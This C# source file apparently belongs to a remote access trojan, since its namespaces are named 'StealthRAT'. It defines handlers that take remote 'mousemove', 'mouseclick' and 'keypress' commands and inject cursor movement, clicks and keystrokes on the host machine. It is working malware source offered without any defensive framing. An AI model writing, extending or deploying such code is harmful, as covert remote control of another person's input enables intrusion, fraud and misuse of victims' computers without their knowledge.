using System;
using System.Text.Json;
using System.Threading.Tasks;
using StealthRAT.Interfaces;
using StealthRAT.Utilities;
using StealthRAT.Services;

namespace StealthRAT.Handlers
{
    /// <summary>
    /// Handles the "mousemove" command to relocate the cursor.
    /// </summary>
    public sealed class MouseMoveHandler : ICommandHandler
    {
        public string CommandName => "mousemove";

        public async Task ExecuteAsync(JsonElement payload, CommandContext context)
        {
            if (payload.TryGetProperty("x", out var xProp) && payload.TryGetProperty("y", out var yProp))
            {
                int x = xProp.GetInt32();
                int y = yProp.GetInt32();
                AuditLoggerService.LogAction("mousemove", $"X: {x}, Y: {y}");
                NativeInputHelper.MoveCursor(x, y);
            }
            await Task.CompletedTask;
        }
    }

    /// <summary>
    /// Handles the "mouseclick" command to simulate clicks.
    /// </summary>
    public sealed class MouseClickHandler : ICommandHandler
    {
        public string CommandName => "mouseclick";

        public async Task ExecuteAsync(JsonElement payload, CommandContext context)
        {
            string button = payload.TryGetProperty("button", out var btnProp) ? btnProp.GetString() ?? "left" : "left";
            AuditLoggerService.LogAction("mouseclick", $"Button: {button}");
            bool isRightClick = button == "right";
            NativeInputHelper.SimulateClick(isRightClick);
            await Task.CompletedTask;
        }
    }

    /// <summary>
    /// Handles the "keypress" command to simulate keystrokes.
    /// </summary>
    public sealed class KeyPressHandler : ICommandHandler
    {
        public string CommandName => "keypress";

        public async Task ExecuteAsync(JsonElement payload, CommandContext context)
        {
            if (payload.TryGetProperty("key", out var keyProp))
            {
                string key = keyProp.GetString() ?? "";
                AuditLoggerService.LogAction("keypress", $"Key: {key}");
                NativeInputHelper.SimulateKeyPress(key);
            }
            await Task.CompletedTask;
        }
    }
}
